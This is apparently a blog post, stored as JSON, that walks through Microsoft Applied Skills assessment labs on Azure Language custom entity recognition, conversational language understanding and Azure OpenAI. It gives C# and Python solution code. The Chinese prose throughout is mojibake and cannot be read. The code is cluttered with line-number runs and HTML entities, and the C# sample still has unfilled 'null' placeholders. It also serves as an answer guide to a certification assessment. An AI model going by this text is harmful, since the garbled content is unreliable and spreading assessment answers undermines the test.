æµç¨‹æ“ä½œæ¥ç€è¿”å›æˆ‘ä»¬åˆšæ‰å¤åˆ¶keyå’ŒEndPointé‚£ä¸ªè¯­è¨€æœåŠ¡çš„ç•Œé¢ï¼Œç‚¹å‡»å·¦è¾¹æ çš„Overviewï¼Œé¦–å…ˆåœ¨æˆ‘ä»¬çš„è¯­è¨€æœåŠ¡ lang-41073075 ä¸­æ‰¾åˆ° Language studio æœåŠ¡å¹¶ç‚¹å‡»è¿›å…¥ã€‚ è¿›å…¥åˆ°æœåŠ¡ä¸­åï¼ŒæŒ‰ç…§å¦‚å›¾æ‰€ç¤ºé…ç½®è‡ªå·±çš„ è®¢é˜…ã€èµ„æºç±»å‹ä»¥åŠèµ„æºåå­—ï¼Œè¿™é‡Œéƒ½æ˜¯ç‚¹å‡»ä¸‹æ‹‰èœå•è¿›è¡Œé€‰æ‹©ã€‚è¿›å…¥åˆ°è¯¥é¡µé¢åï¼Œå¦‚æœæ˜¾ç¤ºæ²¡æœ‰ç™»å½•çš„çŠ¶æ€ï¼Œç‚¹å‡»å³ä¸Šè§’çš„ Sign inï¼Œç™»å½•åè¿›å…¥åˆ°å¦‚ä¸‹ç•Œé¢ é€‰æ‹©å·²æœ‰çš„å­˜åœ¨é¡¹ï¼ŒResource type è¿™é‡Œé€‰æ‹© Languageã€‚é€‰æ‹©å¥½åï¼Œç‚¹å‡» Doneé…ç½®å¥½ Language Studioåï¼Œé€‰æ‹© Extraction information ä¸‹é¢çš„æ ‡ç­¾æ‹‰é¡µé¢ï¼Œ åœ¨è¿™é¡µé¢æ‰¾åˆ° Custom named entity recognition æœåŠ¡ï¼Œç‚¹å‡»è¿›å…¥ã€‚åœ¨é¡µé¢ä¸­ç‚¹å‡»åˆ›å»ºæ–°é¡¹ç›®æŒ‰é’®ã€‚ ç±»ä¼¼äºå‰é¢çš„æ“ä½œï¼Œå…ˆé…ç½®è®¢é˜…ã€èµ„æºã€å­˜å‚¨ç­‰ä¿¡æ¯å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç‚¹å‡» Nextåœ¨åŸºç¡€ä¿¡æ¯éƒ¨åˆ†ï¼Œéœ€è¦å¯¹è®¾ç½®åå­—ï¼Œè¿™é‡Œæ ¹æ®é¢˜ç›®è®¾ç½®åå­—ä¸ºï¼šwebshopï¼Œä¸»è¯­è¨€é€‰æ‹© Englishï¼ˆUSï¼‰ã€‚åœ¨ Blob store container é€‰æ‹©åå­— webshopï¼Œç‚¹å‡» Nextç‚¹å‡» Create project åˆ›å»ºå®Œæ¯•åï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºentityï¼Œè¿›å…¥åˆ° Data labeling é¡µé¢ï¼Œç‚¹å‡»å³ä¾§çš„ Add entity æŒ‰é’®ï¼Œæ ¹æ®é¢˜ç›®ï¼Œåˆ†åˆ«æ·»åŠ  Price å’Œ CustomerNameï¼Œä¸»é¡µè¿™é‡Œä¸‹å›¾æˆ‘åªæ˜¾ç¤ºäº†æ·»åŠ æ–¹æ³•ï¼Œå…·ä½“çš„ Price å’Œ CustomerName è¦éƒ½æ·»åŠ å‡ºæ¥ã€‚åˆ›å»ºå®Œ entity åï¼Œä¾æ¬¡ç‚¹å‡»è¿™ 10 ä¸ªæ–‡ä»¶ï¼Œç»™é‡Œé¢çš„æ–‡ä»¶å†…å®¹æ‰“æ ‡ç­¾å°±è¦ç»™æ•°æ®æ‰“æ ‡ç­¾ï¼Œå…ˆç‚¹å‡»æ ‡ç­¾åé¢çš„ç¬”å½¢çŠ¶çš„æŒ‰é’®ï¼Œç„¶åé€‰æ‹©å¥½å¯¹åº”çš„ä¿¡æ¯ï¼ŒName åé¢æ ‡è®° CustomerName çš„ä¿¡æ¯ï¼ŒPrice åé¢çš„ä¿¡æ¯æ ‡è®° Price æ ‡ç­¾ã€‚æ ‡è®°ä¸Šå°±æ˜¯å’Œå›¾ç‰‡ä¸Šçš„ä¸€æ ·ã€‚æ¯æ ‡è®°å®Œä¸€ä¸ªï¼Œç‚¹å‡» next documentï¼Œç›´åˆ° 10 ä¸ªæ–‡ä»¶éƒ½æ ‡è®°å¥½æ³¨æ„ï¼šè¿™ä¸ªæ­¥éª¤è¦è®²æ‰€æœ‰çš„æ–‡æ¡£éƒ½æ‰“ä¸Šæ ‡ç­¾ã€‚ å®Œæˆä¸Šè¿°æ‰€æœ‰æ ‡ç­¾åï¼Œç‚¹å‡»èœå•ä¸­çš„ Training jobsï¼Œç‚¹å‡» Start a training jobã€‚ ä¸ºè‡ªå·±çš„è®­ç»ƒæ¨¡å‹å–ä¸€ä¸ªåå­—ï¼Œä¾‹å¦‚ model-job-01 ä¹‹åç‚¹å‡» Train æŒ‰é’®ã€‚ ç‚¹å‡»æŒ‰é’®åçš„é¡µé¢ï¼Œåˆ°æ­¤æ­¥éª¤ï¼Œé¡µé¢åœ¨åå°è‡ªå·±è®­ç»ƒå°±å¥½ã€‚å®éªŒ2å°±å®Œæˆäº†ã€‚ è¯•éªŒä¸‰ï¼šChatbot backendåœ¨è¿™ä¸ªå®éªŒä¸­ä¸»è¦æ˜¯åˆ›å»ºä¸€ä¸ªå¯¹è¯æœºå™¨äººï¼Œä¹‹åå¯¼å…¥å…·ä½“çš„æ¨¡å‹åï¼Œä½¿ç”¨ä»£ç è¿›è¡Œå¯¹è¯æ“ä½œã€‚å®éªŒæµç¨‹è¿›å…¥ https://language.cognitive.azure.com/homeé€‰æ‹© Understand questions and conversational languageä¸­æ‰¾åˆ° Conversational language understanding å­æœåŠ¡ã€‚è¿›å…¥ è¿›å…¥åˆ° Conversational language understanding å­æœåŠ¡åï¼Œç‚¹å‡» Import æŒ‰é’®ï¼Œé€‰æ‹©C:\\project æ–‡ä»¶å¤¹ä¸‹çš„ lang4567.json æ–‡ä»¶ï¼Œname å‘½åä¸º lang4567 ï¼Œç‚¹å‡» done å®Œæˆä¸Šé¢æ­¥éª¤åï¼Œç‚¹å‡» Training jobs èœå•ã€‚ç‚¹å‡» Starting a training jobåœ¨æˆ‘ä»¬æ–°å»ºçš„è®­ç»ƒä»»åŠ¡é‡ï¼Œé€‰æ‹©è®­ç»ƒæ¨¡å‹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šé¢åˆ›å»ºçš„lang4567åœ¨è¿™é‡Œæ•°æ®åˆ‡å‰²é€‰é¡¹éœ€è¦æ³¨æ„ï¼Œæ ¹æ®é¢˜ç›®è®¾ç½® 85% å’Œ 15%ã€‚ 858585 ç›´æ¥ç‚¹å‡» Train æŒ‰é’®ï¼Œè¿›è¡Œè®­ç»ƒ ç‚¹å‡»å·¦è¾¹æ çš„ Deploying a model åï¼Œç‚¹å‡»Add deploymentã€‚ç­‰å¾…æ¨¡å‹è®­ç»ƒå®Œæˆ å‡ºç°å¦‚ä¸‹å›¾æ ‡ï¼Œæˆ‘ä»¬è¿›è¡Œéƒ¨ç½² ç‚¹å‡»Add deploymentã€‚ åœ¨æ–°é¡µé¢é€‰æ‹©åˆ›å»ºä¸€ä¸ªæ–°éƒ¨ç½²ï¼Œåå­—å’Œæ¨¡å‹éƒ½è®¾ç½®ä¸º lang4567ï¼Œæ·»åŠ å®Œæˆåï¼Œç‚¹å‡»éƒ¨ç½²æŒ‰é’®ã€‚ ç­‰å¾…æ¨¡å‹éƒ¨ç½²å®Œæˆ åŒå‡»æ‰“å¼€ C:\\CLU_PoC\\Csharp æ–‡ä»¶å¤¹ä¸‹é¢çš„ .cs ï¼Œå…ˆè¦åšçš„æ˜¯ç±»ä¼¼ç¬¬ä¸€ä¸ªè¯•éªŒä¸Šé¢çš„æ›¿æ¢keyå’Œendpointï¼Œä½†æ˜¯ projectName å’Œ deploymentName åˆ†åˆ«æ˜¯æˆ‘ä»¬åˆšæ‰è®¾ç½®çš„ lang4567ã€‚åˆšç¬¬ä¸€é¢˜çš„key å’Œ EndPoint æ˜¯ä¸€æ ·çš„ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283using Azure;using System;using System.Text.Json;using Azure.Core;using Azure.AI.Language.Conversations;namespace ProofOfConcept&#123; class Program &#123; private static readonly AzureKeyCredential credential = new AzureKeyCredential(&quot;&#123;REPLACE-WITH-YOUR-VALUE&#125;&quot;); private static readonly Uri endpoint = new Uri(&quot;&#123;REPLACE-WITH-YOUR-VALUE&#125;&quot;); private static readonly string projectName = &quot;&#123;REPLACE-WITH-YOUR-VALUE&#125;&quot;; private static readonly string deploymentName = &quot;&#123;REPLACE-WITH-YOUR-VALUE&#125;&quot;; static void RecognizeYourText(string ? query) &#123; if(query == null || query.Length &gt; 1000) &#123; query = &quot;can you send me a few gizmos?&quot;; &#125; var data = new &#123; analysisInput = new &#123; conversationItem = new &#123; text = query, id = &quot;1&quot;, participantId = &quot;1&quot;, &#125; &#125;, parameters = new &#123; projectName, deploymentName, stringIndexType = &quot;Utf16CodeUnit&quot;, &#125;, kind = &quot;Conversation&quot;, &#125;; // Create client and send request var client = new null(endpoint, credential); // replace null with the correct method to recognize the requested information. Response response = client.null(RequestContent.Create(data)); // replace null with the correct method to recognize the requested information. if(response.ContentStream == null) &#123; Console.WriteLine(&quot;No response received.&quot;); return; &#125; using JsonDocument result = JsonDocument.Parse(response.ContentStream); JsonElement conversationalTaskResult = result.RootElement; JsonElement conversationPrediction = conversationalTaskResult.GetProperty(&quot;result&quot;).GetProperty(&quot;prediction&quot;); Console.WriteLine(&quot;Intents:&quot;); foreach(JsonElement intent in conversationPrediction.GetProperty(&quot;intents&quot;).EnumerateArray()) &#123; Console.WriteLine($ &quot;Category: &#123;intent.GetProperty(&quot; category &quot;).GetString()&#125;&quot;); Console.WriteLine($ &quot;Confidence: &#123;intent.GetProperty(&quot; confidenceScore &quot;).GetSingle()&#125;&quot;); Console.WriteLine(); &#125; Console.WriteLine(&quot;Entities:&quot;); foreach(JsonElement entity in conversationPrediction.GetProperty(&quot;entities&quot;).EnumerateArray()) &#123; Console.WriteLine($ &quot;Category: &#123;entity.GetProperty(&quot; category &quot;).GetString()&#125;&quot;); Console.WriteLine($ &quot;Text: &#123;entity.GetProperty(&quot; text &quot;).GetString()&#125;&quot;); Console.WriteLine($ &quot;Offset: &#123;entity.GetProperty(&quot; offset &quot;).GetInt32()&#125;&quot;); Console.WriteLine($ &quot;Length: &#123;entity.GetProperty(&quot; length &quot;).GetInt32()&#125;&quot;); Console.WriteLine($ &quot;Confidence: &#123;entity.GetProperty(&quot; confidenceScore &quot;).GetSingle()&#125;&quot;); Console.WriteLine(); &#125; &#125; static void Main(string[] args) &#123; string ? input = null; if(args.Length &gt; 0) &#123; input = System.IO.File.ReadAllText(args[0]); &#125; RecognizeYourText(input); Console.Write(&quot;Press any key to exit.&quot;); Console.ReadKey(); &#125; &#125;&#125; cmd build run , ok oråŒå‡»æ‰“å¼€ C:\\CLU_PoC\\Python æ–‡ä»¶å¤¹ä¸‹é¢çš„ App1.py ï¼Œå…ˆè¦åšçš„æ˜¯ç±»ä¼¼ç¬¬ä¸€ä¸ªè¯•éªŒä¸Šé¢çš„æ›¿æ¢keyå’Œendpointï¼Œä½†æ˜¯ project_name å’Œ deployment_name åˆ†åˆ«æ˜¯æˆ‘ä»¬åˆšæ‰è®¾ç½®çš„ lang4567ã€‚åˆšç¬¬ä¸€é¢˜çš„key å’Œ EndPoint æ˜¯ä¸€æ ·çš„ ä¿®æ”¹å®Œä»£ç åï¼Œè·Ÿè¯•é¢˜ä¸€åŒæ ·çš„æ–¹æ³•ï¼Œåœ¨å½“å‰æ–‡ä»¶çš„æ–‡ä»¶å¤¹åœ°å€æ è¾“å…¥ cmd ,åœ¨å‘½ä»¤çª—å£è¾“å…¥python App1.pyè¿è¡Œ App1 ï¼Œæœ‰å¦‚ä¸‹ä¿¡æ¯åè¯æ˜æˆåŠŸ å®Œæˆ3ä¸ªæ­¥éª¤è¯•éªŒåï¼Œç‚¹å‡»ç•Œé¢ä¸­çš„ Submit Assessment æŒ‰é’®ï¼Œå¼¹å‡ºçš„ç¡®è®¤é¡µé¢åç‚¹å‡» Submit æŒ‰é’®ã€‚ è¯ä¹¦ End","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Python","slug":"Python","permalink":"https://banjinmei.github.io/tags/Python/"},{"name":"Azure","slug":"Azure","permalink":"https://banjinmei.github.io/tags/Azure/"},{"name":"OpenAI","slug":"OpenAI","permalink":"https://banjinmei.github.io/tags/OpenAI/"}],"author":"mu"},{"title":"Azure AI Develop Generative AI solutions","slug":"Azure-OpenAI-sln","date":"2024-06-05T16:18:03.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/06/06/Azure-OpenAI-sln/","permalink":"https://banjinmei.github.io/2024/06/06/Azure-OpenAI-sln/","excerpt":"","text":"Starthttps://learn.microsoft.com/en-us/credentials/applied-skills/develop-generative-ai-solutions-with-azure-openai-service/#applied-skill-take-the-assessment éƒ¨ç½²Azure OpenAI æœåŠ¡â€‹ ç‚¹å‡»Step 1ï¼Œç„¶åç‚¹å‡»Passwordå³è¾¹çš„Tâ€‹ é¼ æ ‡åŒå‡»Emailâ€‹å¯¹Inboxçš„å†…å®¹è¿›è¡Œé€ä¸ªç‚¹å‡»ï¼Œå…¶ä¸­Existing EnvironmentåŒ…å«äº†å¾®è½¯å®˜æ–¹æä¾›çš„Azureçš„ç”¨æˆ·åå’Œå¯†ç ï¼ŒValidate proof of conceptã€Company chatbotã€Developer taskså’ŒUse company dataåˆ†åˆ«è¡¨ç¤ºçš„æ˜¯æœ¬æ¬¡è€ƒè¯•çš„å››å¤§ä»»åŠ¡çš„å…·ä½“è¦æ±‚ åˆ‡æ¢åˆ°Azureç™»å½•çš„æ ‡ç­¾é¡µ â€‹å°†é‚®ç®±ä¸­Existing Environmentçš„ç”¨æˆ·åå’Œå¯†ç ä¾æ¬¡å¤åˆ¶åˆ°Azureçš„æ ‡ç­¾é¡µé¢ä¸­ï¼Œå¹¶ç‚¹å‡»Sign inå®ŒæˆAzureçš„ç™»å½• ç„¶ååœ¨æµè§ˆå™¨ä¸­è¾“å…¥URLï¼šhttps://portal.azure.com/#homeï¼Œç‚¹å‡»Azure AI services â€‹å…¶ä¸­Resource groupã€Pricing tierå‹¾é€‰ä¸‹æ‹‰åˆ—è¡¨çš„å­˜åœ¨é¡¹ï¼ŒNameå¯è‡ªè¡Œå¡«å…¥(å¦‚azureservice)ï¼Œç„¶åç‚¹å‡»Nextâ€‹ ç½‘ç»œä¸­é€‰æ‹©ç¬¬ä¸€é¡¹ï¼šAll networksï¼Œç„¶åç‚¹å‡»é¡µé¢å·¦ä¸‹æ–¹çš„NextTagså¯ç›´æ¥ç‚¹å‡»å·¦ä¸‹æ–¹çš„Nextç„¶ååœ¨Review+submité¡µé¢ç‚¹å‡»Createâ€‹ç­‰å¾…å‡ åç§’åï¼Œdeploymentå®Œæˆåï¼Œç‚¹å‡»Deployment detailsç‚¹å‡»Resourceä¸­çš„åç§°ï¼Œå¦‚azureserviceâ€‹ç‚¹å‡»Endpointså³è¾¹çš„Click here to view endpointsâ€‹â€‹ ç‚¹å‡»Key 1å³ä¾§çš„å¤åˆ¶æŒ‰é’®ï¼Œå¤åˆ¶å…¶åˆ°C:\\files\\AzureOpenAIPoc\\Python.envä¸­çš„AZURE_OAI_KEYå˜é‡ä¸­ã€‚ç‚¹å‡»Endpointå³ä¾§çš„å¤åˆ¶æŒ‰é’®ï¼Œåˆ†åˆ«å¤åˆ¶ä»»æ„ä¸€ä¸ª KEY å’Œ EndPoint åˆ°C:\\files\\AzureOpenAIPoc\\Python.envä¸­çš„AZURE_OAI_KEY å’Œ AZURE_OAI_ENDPOINTã€‚ ç„¶ååœ¨æµè§ˆå™¨ä¸­è¾“å…¥https://portal.azure.com/#homeï¼Œå¹¶ç‚¹å‡»Nameä¸‹çš„åç§° ç‚¹å‡»Go to Azure OpenAI Studio ç„¶åç‚¹å‡»Create new deployment æŒ‰ç…§ä¸‹å›¾ä¸­çš„å†…å®¹è¿›è¡Œä¸‹æ‹‰é€‰æ‹©æˆ–è€…å¡«å†™ï¼Œå…¶ä¸­Select a modelå‹¾é€‰ä¸ºgpt-35-turbo-16kï¼ŒDeployment nameå¯è‡ªå®šä¹‰å¡«å†™ï¼Œå¦‚gpt_deployï¼Œå°†Tokens per Minute Rate Limitè®¾ç½®ä¸º5Kï¼ŒEnable Dynamic Quotaè®¾ç½®ä¸ºDisabledï¼Œæœ€åç‚¹å‡»Createï¼š ç¡®ä¿Statusä¸ºSucceedï¼Œåˆ™è¯´æ˜éƒ¨ç½²æˆåŠŸäº† å°†C:\\files\\AzureOpenAIPoc\\Python.envä¸­AZURE_OAI_MODELè®¾ç½®ä¸ºDeployment nameï¼Œå¦‚gpt_deploy AI Searchç›¸å…³æ“ä½œç„¶ååœ¨æµè§ˆå™¨ä¸­è¾“å…¥https://portal.azure.com/#homeï¼Œåœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥ai searchï¼Œç‚¹å‡»AI Searchç‚¹å‡»Nameä¸‹çš„åç§° ç‚¹å‡»Import data åœ¨Connect to your dataä¸­å‹¾é€‰Data Sourceä¸ºAzure Blob Storage ç‚¹å‡»Nameä¸‹çš„åç§°é€‰æ‹©blob1ï¼Œå¹¶ç‚¹å‡»Select å¡«å…¥azureï¼Œå¹¶ç‚¹å‡»å·¦ä¸‹æ–¹çš„Nextï¼šAdd cognitive skillsï¼š åœ¨Add cognitive skillsä¸­ç‚¹å‡»Skip to: Customize target index ä¿®æ”¹index nameä¸ºpocindexï¼Œç„¶åç‚¹å‡»Next: Create an indexe ä¿®æ”¹Indexerçš„Nameä¸ºpocindexï¼Œç„¶åç‚¹å‡»Submit å¤åˆ¶å…¶ url ä½œä¸ºC:\\files\\AzureOpenAIPoc\\Python.envä¸­çš„å€¼SEARCH_ENDPOINT ç‚¹å‡»Essentialså·¦è¾¹çš„ç®­å¤´æ”¶èµ·è¯¥éƒ¨åˆ†å†…å®¹ï¼Œç„¶åç‚¹å‡»Propertiesï¼Œå†ç‚¹å‡»API keys ç„¶åç‚¹å‡»Primary admin keysä¸­çš„å¤åˆ¶æŒ‰é’®ï¼Œå¤åˆ¶å…¶åˆ°C:\\files\\AzureOpenAIPoc\\Python.envä¸­çš„SEARCH_KEYå˜é‡ä¸­ã€‚ä¿®æ”¹å…¶ä¸­SEARCH_INDEXä¸ºpocindex ä¿®æ”¹åå®Œæ•´çš„.envå†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼Œå†™æ”¹å®Œåè®°å¾—ä¿å­˜å¹¶å…³é—­ ä¿®æ”¹PoC.pyæ–‡ä»¶å…·ä½“è·¯å¾„ä¸ºï¼šC:\\files\\AzureOpenAIPoc\\Python\\PoC.pyã€‚æ‰“å¼€æ–‡ä»¶çš„æ–¹æ³•å¯å‚è€ƒéƒ¨ç½²Azure OpenAIæœåŠ¡ä¸­çš„.envæ–‡ä»¶ï¼Œå”¯ä¸€å·®åˆ«ä¹‹å¤„åœ¨äºPoC.pyå¯åŒå‡»æ‰“å¼€ã€‚éœ€è¦è¯´æ˜çš„æ˜¯ï¼šç²˜è´´åè®°å¾—æŒ‰ä¸‹ctrl+sè¿›è¡Œä¿å­˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200import osimport requestsfrom dotenv import load_dotenvimport utilsfrom openai import AzureOpenAIimport asynciofrom openai import AsyncAzureOpenAI# Add OpenAI import. (Add code here)def main(): try: load_dotenv() utils.initLogFile() azure_oai_endpoint = os.getenv(&quot;AZURE_OAI_ENDPOINT&quot;) azure_oai_key = os.getenv(&quot;AZURE_OAI_KEY&quot;) azure_oai_model = os.getenv(&quot;AZURE_OAI_MODEL&quot;) # Define Azure OpenAI client (Add code here)################## client = AzureOpenAI( azure_endpoint=azure_oai_endpoint, api_key=azure_oai_key, api_version=&quot;2024-02-15-preview&quot; ) function_map = &#123; &quot;1&quot;: function1, &quot;2&quot;: function2, &quot;3&quot;: function3, &quot;4&quot;: function4 &#125; while True: print(&#x27;1: Validate PoC\\n&#x27; + &#x27;2: Company chatbot\\n&#x27; + &#x27;3: Developer tasks\\n&#x27; + &#x27;4: Use company data\\n&#x27; + &#x27;\\&#x27;quit\\&#x27; to exit the program\\n&#x27;) command = input(&#x27;Enter a number:&#x27;) if command.strip() in function_map: function_map[command](client, azure_oai_model) elif command.strip().lower() == &#x27;quit&#x27;: print(&#x27;Exiting program...&#x27;) break else: print(&quot;Invalid input. Please enter number 1, 2, 3, 4, or 5.&quot;) except Exception as ex: print(ex)# Task 1: Validate PoCdef function1(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 1: Validate PoC&quot;, &quot;sample-text.txt&quot;) # Build messages to send to Azure OpenAI model. (Add code here) messages = [ &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: inputText&#125; ] # Define argument list (Add code here) apiParams = &#123; &quot;messages&quot;: messages, &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create( model=aiModel, messages=messages, temperature=0.7, max_tokens=800 ) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: &quot; + response.choices[0].message.content + &quot;\\n&quot;) return response# Task 2: Company chatbotdef function2(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 2: Company chatbot&quot;, &quot;sample-text.txt&quot;) messages = [ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant that responds in a casual tone. Each response should end with &#x27;Hope that helps! Thanks for using Contoso, Ltd.&#x27;&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;What is the best way to find if a company is hiring?&quot;&#125;, &#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;You can start by checking the company&#x27;s website, especially the careers section. Hope that helps! Thanks for using Contoso, Ltd.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: inputText&#125; ] # Define argument list (Add code here) apiParams = &#123; &quot;model&quot;: aiModel, &quot;messages&quot;: messages, &quot;max_tokens&quot;: 1000, &quot;temperature&quot;: 0.5 &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: &quot; + response.choices[0].message.content + &quot;\\n&quot;) return response# Task 3: Developer tasksdef function3(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 3: Developer tasks&quot;, &quot;sample-text.txt&quot;) # Define system message based on the task system_message = &quot;Take the legacy code in legacyCode.py, add comments and generate documentation.&quot; messages = [ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: system_message&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: inputText&#125; ] # Define argument list (Add code here) apiParams = &#123; &quot;model&quot;: aiModel, &quot;messages&quot;: messages, &quot;max_tokens&quot;: 1000, &quot;temperature&quot;: 0.5 &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: &quot; + response.choices[0].message.content + &quot;\\n&quot;) return response # Task 4: Use company datadef function4(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 4: Use company data&quot;, &quot;sample-text.txt&quot;) # Build messages to send to Azure OpenAI model. (Add code here) search_endpoint = os.getenv(&quot;SEARCH_ENDPOINT&quot;) search_key = os.getenv(&quot;SEARCH_KEY&quot;) search_index = os.getenv(&quot;SEARCH_INDEX&quot;) # Perform the search query search_query = &#123; &quot;search&quot;: inputText, &quot;searchMode&quot;: &quot;any&quot;, &quot;queryType&quot;: &quot;simple&quot;, &quot;top&quot;: 5 # Adjust the number of results as needed &#125; headers = &#123; &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;api-key&quot;: search_key &#125; search_url = f&quot;&#123;search_endpoint&#125;/indexes/&#123;search_index&#125;/docs/search?api-version=2021-04-30-Preview&quot; response = requests.post(search_url, headers=headers, json=search_query) search_results = response.json() # Extract relevant search results search_snippets = [result[&quot;content&quot;] for result in search_results[&quot;value&quot;]] search_content = &quot;\\n\\n&quot;.join(search_snippets) # Build messages for OpenAI with search results included messages = [ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful travel agent.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: f&quot;&#123;inputText&#125;\\n\\nSearch Results:\\n&#123;search_content&#125;&quot;&#125; ] # Define connection and argument list (Add code here) apiParams = &#123; &quot;model&quot;: aiModel, &quot;messages&quot;: messages, &quot;max_tokens&quot;: 1000, &quot;temperature&quot;: 0.5 &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. Will be the same as function1 (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: &quot; + response.choices[0].message.content + &quot;\\n&quot;) return# Call main function. Do not modify.if __name__ == &#x27;__main__&#x27;: main() å°†ä¸Šè¿°ä¿®æ”¹åçš„ä»£ç å¤åˆ¶åˆ°C:\\files\\AzureOpenAIPoc\\Python\\PoC.pyä¸­ï¼Œæ‰“å¼€æ–‡ä»¶æ–¹æ³•è¾ƒä¸ºç®€å•ï¼Œå³é€šè¿‡é¼ æ ‡åŒå‡»ä¹Ÿå°±æ˜¯é€šè¿‡VScodeå·¥å…·æ‰“å¼€è¯¥æ–‡ä»¶å¯ä½¿ç”¨ctrl+aåˆ é™¤å…¨éƒ¨å†…å®¹ï¼Œç„¶åå†é€šè¿‡ctrl+cå’Œctrl+vè¿›è¡Œå¤åˆ¶ï¼Œæ¥ç€æŒ‰ctrl+sè¿›è¡Œä¿å­˜ï¼Œæœ€ååœ¨åœ°å€æ åˆ é™¤å·²æœ‰å†…å®¹ï¼Œå¹¶åœ¨å…¶ä¸­è¾“å…¥cmdï¼Œå¹¶æŒ‰ä¸‹å›è½¦é”® è¿›å…¥åˆ°cmdä¸­åï¼Œè¾“å…¥python PoC.pyï¼Œæ¯è¾“å…¥å®Œä¸€ä¸ªå‘½ä»¤æŒ‰å›è½¦ä»£è¡¨æ‰§è¡Œè¯¥å‘½ä»¤ ç„¶åå¯è¾“å…¥é¢˜å·ï¼Œæ¯”å¦‚ è¾“å…¥1 ä»£è¡¨çš„æ˜¯ç¬¬ä¸€ä¸ªé¢˜(Validate PoC)ï¼Œç„¶åå¯è¾“å…¥typeæˆ–è€…fileï¼Œå…¶ä¸­typeæŒ‡çš„æ˜¯è‡ªè¡Œè¾“å…¥promptï¼Œè€Œfileæ˜¯ä»ç›®å½•ä¸‹çš„sample-text.txtè¯»å–å¾—åˆ°è¾“å…¥promptã€‚éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œå¯è¿ç»­è¿›è¡Œæé—®ï¼Œä¸éœ€è¦ä¸­é—´é€€å‡ºã€‚ ç¬¬ä¸€é¢˜ç¬¬ä¸€é¢˜å¯ä¾æ¬¡è¾“å…¥typeã€who are you(æˆ–è€…å…¶å®ƒprompt)è¿›è¡Œæé—®æˆ–è€…ç›´æ¥è¾“å…¥fileè¿›è¡Œæé—®ã€‚æŸ¥çœ‹ç»“æœæ˜¯å¦æ­£å¸¸è¾“å‡ºã€‚ ç¬¬äºŒé¢˜ç¬¬äºŒé¢˜å¯ä¾æ¬¡è¾“å…¥typeã€who are youæ¥è¿›è¡Œæé—®ï¼Œæˆ–è€…ä¾æ¬¡è¾“å…¥typeå’Œå…¶ä»–é—®é¢˜ã€‚æŸ¥çœ‹æ˜¯å¦ä»¥Hope that helps!Thanks for using Contoso,Ltd.ç»“å°¾ã€‚ ç„¶åå†åœ¨ç¬¬äºŒé¢˜ä¸­è¾“å…¥typeå’ŒGet the response in both English and Spanish: what is the best way to find if a company is hiring?(å¯ç›´æ¥ctrl+cã€ctrl+vè¿›è¡Œå¤åˆ¶)è¿›è¡Œæé—® ç¬¬ä¸‰é¢˜ç¬¬ä¸‰é¢˜éœ€è¦å¤åˆ¶å¹¶è¿è¡Œæ–‡ä»¶ä¸¤æ¬¡ï¼Œå…·ä½“æ¥è¯´ï¼šç¬¬ä¸€æ¬¡ æ˜¯å°†c:\\filesä¸‹çš„legacyCode.pyå¤åˆ¶åˆ°C:\\files\\AzureOpenAIPoc\\Python è·¯å¾„ä¸‹ï¼Œé¦–å…ˆåˆ é™¤æ–‡ä»¶å¤¹ä¸­å·²æœ‰çš„sample-text.txtï¼Œå¹¶å°†legacyCode.pyé‡å‘½åä¸ºsample-text.txt(ï¼ï¼ï¼æ³¨æ„æ˜¯sample-text.txtï¼Œè€Œä¸æ˜¯sample-text.py)ã€‚ç„¶åè¿è¡Œpython PoC.pyï¼Œå¹¶è¾“å…¥3 å’Œ fileï¼ŒæŸ¥çœ‹ç»“æœæ˜¯å¦äº§ç”Ÿäº†æ³¨é‡Šã€‚ 